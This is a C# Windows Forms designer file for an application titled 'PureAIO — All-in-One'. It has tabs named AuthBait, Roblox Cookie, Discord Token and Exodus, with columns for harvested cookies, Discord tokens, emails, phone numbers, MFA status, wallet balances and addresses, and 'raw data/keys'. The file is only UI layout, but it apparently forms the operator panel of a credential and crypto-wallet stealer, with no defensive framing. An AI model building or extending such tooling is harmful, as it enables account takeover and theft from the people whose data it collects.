namespace PureAIO
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null)) components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.tabControl1          = new System.Windows.Forms.TabControl();
            // ── AuthBait tab ──────────────────────────────────────────────────
            this.tabAuthBait          = new System.Windows.Forms.TabPage();
            this.rtbAuthBait          = new System.Windows.Forms.RichTextBox();
            // ── Cookie tab ────────────────────────────────────────────────────
            this.tabCookie            = new System.Windows.Forms.TabPage();
            this.lvCookies            = new System.Windows.Forms.ListView();
            this.rtbCookieLog         = new System.Windows.Forms.RichTextBox();
            // ── Token tab ─────────────────────────────────────────────────────
            this.tabToken             = new System.Windows.Forms.TabPage();
            this.lvTokens             = new System.Windows.Forms.ListView();
            this.rtbTokenLog          = new System.Windows.Forms.RichTextBox();
            // ── Exodus tab ────────────────────────────────────────────────────
            this.tabExodus            = new System.Windows.Forms.TabPage();
            this.lvExodusData         = new System.Windows.Forms.ListView();
            this.lvExodusBalances     = new System.Windows.Forms.ListView();
            this.rtbExodusLog         = new System.Windows.Forms.RichTextBox();

            this.tabControl1.SuspendLayout();
            this.SuspendLayout();

            // ── tabControl ───────────────────────────────────────────────────
            this.tabControl1.Controls.Add(this.tabAuthBait);
            this.tabControl1.Controls.Add(this.tabCookie);
            this.tabControl1.Controls.Add(this.tabToken);
            this.tabControl1.Controls.Add(this.tabExodus);
            this.tabControl1.Dock     = System.Windows.Forms.DockStyle.Fill;
            this.tabControl1.Name     = "tabControl1";
            this.tabControl1.SelectedIndex = 0;

            // ── AuthBait ─────────────────────────────────────────────────────
            this.tabAuthBait.Controls.Add(this.rtbAuthBait);
            this.tabAuthBait.Name = "tabAuthBait";
            this.tabAuthBait.Text = "AuthBait";
            this.tabAuthBait.Padding = new System.Windows.Forms.Padding(3);

            this.rtbAuthBait.Dock      = System.Windows.Forms.DockStyle.Fill;
            this.rtbAuthBait.BackColor = System.Drawing.Color.Black;
            this.rtbAuthBait.ForeColor = System.Drawing.Color.Lime;
            this.rtbAuthBait.Font      = new System.Drawing.Font("Consolas", 9f);
            this.rtbAuthBait.ReadOnly  = true;
            this.rtbAuthBait.Name      = "rtbAuthBait";

            // ── Cookie ───────────────────────────────────────────────────────
            this.tabCookie.Controls.Add(this.lvCookies);
            this.tabCookie.Controls.Add(this.rtbCookieLog);
            this.tabCookie.Name = "tabCookie";
            this.tabCookie.Text = "Roblox Cookie";
            this.tabCookie.Padding = new System.Windows.Forms.Padding(3);

            this.rtbCookieLog.Dock      = System.Windows.Forms.DockStyle.Bottom;
            this.rtbCookieLog.Height    = 70;
            this.rtbCookieLog.BackColor = System.Drawing.Color.Black;
            this.rtbCookieLog.ForeColor = System.Drawing.Color.Lime;
            this.rtbCookieLog.Font      = new System.Drawing.Font("Consolas", 8f);
            this.rtbCookieLog.ReadOnly  = true;
            this.rtbCookieLog.Name      = "rtbCookieLog";

            this.lvCookies.Dock         = System.Windows.Forms.DockStyle.Fill;
            this.lvCookies.View         = System.Windows.Forms.View.Details;
            this.lvCookies.FullRowSelect= true;
            this.lvCookies.GridLines    = true;
            this.lvCookies.Name         = "lvCookies";
            this.lvCookies.Columns.Add("Source",        90);
            this.lvCookies.Columns.Add("Cookie",       180);
            this.lvCookies.Columns.Add("User ID",       80);
            this.lvCookies.Columns.Add("Username",      90);
            this.lvCookies.Columns.Add("Display Name",  90);
            this.lvCookies.Columns.Add("Robux",         70);
            this.lvCookies.Columns.Add("Premium",       60);
            this.lvCookies.Columns.Add("2FA",           40);
            this.lvCookies.Columns.Add("Country",       60);
            this.lvCookies.Columns.Add("Created",       80);
            this.lvCookies.Columns.Add("Note",         120);

            // ── Token ────────────────────────────────────────────────────────
            this.tabToken.Controls.Add(this.lvTokens);
            this.tabToken.Controls.Add(this.rtbTokenLog);
            this.tabToken.Name = "tabToken";
            this.tabToken.Text = "Discord Token";
            this.tabToken.Padding = new System.Windows.Forms.Padding(3);

            this.rtbTokenLog.Dock      = System.Windows.Forms.DockStyle.Bottom;
            this.rtbTokenLog.Height    = 70;
            this.rtbTokenLog.BackColor = System.Drawing.Color.Black;
            this.rtbTokenLog.ForeColor = System.Drawing.Color.Lime;
            this.rtbTokenLog.Font      = new System.Drawing.Font("Consolas", 8f);
            this.rtbTokenLog.ReadOnly  = true;
            this.rtbTokenLog.Name      = "rtbTokenLog";

            this.lvTokens.Dock          = System.Windows.Forms.DockStyle.Fill;
            this.lvTokens.View          = System.Windows.Forms.View.Details;
            this.lvTokens.FullRowSelect = true;
            this.lvTokens.GridLines     = true;
            this.lvTokens.Name          = "lvTokens";
            this.lvTokens.Columns.Add("Source",         90);
            this.lvTokens.Columns.Add("Token",         140);
            this.lvTokens.Columns.Add("User ID",        90);
            this.lvTokens.Columns.Add("Username",       90);
            this.lvTokens.Columns.Add("Display Name",   90);
            this.lvTokens.Columns.Add("Email",         130);
            this.lvTokens.Columns.Add("Verified",       55);
            this.lvTokens.Columns.Add("Phone",          90);
            this.lvTokens.Columns.Add("MFA",            40);
            this.lvTokens.Columns.Add("Nitro",          65);
            this.lvTokens.Columns.Add("Nitro Exp",      80);
            this.lvTokens.Columns.Add("Locale",         55);
            this.lvTokens.Columns.Add("Created",        80);
            this.lvTokens.Columns.Add("Note",          110);

            // ── Exodus ───────────────────────────────────────────────────────
            this.tabExodus.Controls.Add(this.lvExodusData);
            this.tabExodus.Controls.Add(this.lvExodusBalances);
            this.tabExodus.Controls.Add(this.rtbExodusLog);
            this.tabExodus.Name = "tabExodus";
            this.tabExodus.Text = "Exodus";
            this.tabExodus.Padding = new System.Windows.Forms.Padding(3);

            this.rtbExodusLog.Dock      = System.Windows.Forms.DockStyle.Bottom;
            this.rtbExodusLog.Height    = 60;
            this.rtbExodusLog.BackColor = System.Drawing.Color.Black;
            this.rtbExodusLog.ForeColor = System.Drawing.Color.Lime;
            this.rtbExodusLog.Font      = new System.Drawing.Font("Consolas", 8f);
            this.rtbExodusLog.ReadOnly  = true;
            this.rtbExodusLog.Name      = "rtbExodusLog";

            // top half: balances
            this.lvExodusBalances.Dock          = System.Windows.Forms.DockStyle.Top;
            this.lvExodusBalances.Height        = 180;
            this.lvExodusBalances.View          = System.Windows.Forms.View.Details;
            this.lvExodusBalances.FullRowSelect = true;
            this.lvExodusBalances.GridLines     = true;
            this.lvExodusBalances.Name          = "lvExodusBalances";
            this.lvExodusBalances.Columns.Add("Ticker",   60);
            this.lvExodusBalances.Columns.Add("Name",    100);
            this.lvExodusBalances.Columns.Add("Balance", 120);
            this.lvExodusBalances.Columns.Add("USD",      90);
            this.lvExodusBalances.Columns.Add("Address", 240);
            this.lvExodusBalances.Columns.Add("Enabled",  55);

            // bottom half: raw data/keys
            this.lvExodusData.Dock          = System.Windows.Forms.DockStyle.Fill;
            this.lvExodusData.View          = System.Windows.Forms.View.Details;
            this.lvExodusData.FullRowSelect = true;
            this.lvExodusData.GridLines     = true;
            this.lvExodusData.Name          = "lvExodusData";
            this.lvExodusData.Columns.Add("Kind",   130);
            this.lvExodusData.Columns.Add("Wallet",  80);
            this.lvExodusData.Columns.Add("Value",  400);

            // ── Form ─────────────────────────────────────────────────────────
            this.AutoScaleDimensions = new System.Drawing.SizeF(7f, 15f);
            this.AutoScaleMode       = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize          = new System.Drawing.Size(1100, 600);
            this.Controls.Add(this.tabControl1);
            this.Name = "Form1";
            this.Text = "PureAIO — All-in-One";

            this.tabControl1.ResumeLayout(false);
            this.ResumeLayout(false);
        }

        // ── Fields ────────────────────────────────────────────────────────────
        private System.Windows.Forms.TabControl  tabControl1;
        private System.Windows.Forms.TabPage     tabAuthBait;
        private System.Windows.Forms.RichTextBox rtbAuthBait;
        private System.Windows.Forms.TabPage     tabCookie;
        private System.Windows.Forms.ListView    lvCookies;
        private System.Windows.Forms.RichTextBox rtbCookieLog;
        private System.Windows.Forms.TabPage     tabToken;
        private System.Windows.Forms.ListView    lvTokens;
        private System.Windows.Forms.RichTextBox rtbTokenLog;
        private System.Windows.Forms.TabPage     tabExodus;
        private System.Windows.Forms.ListView    lvExodusData;
        private System.Windows.Forms.ListView    lvExodusBalances;
        private System.Windows.Forms.RichTextBox rtbExodusLog;
    }
}
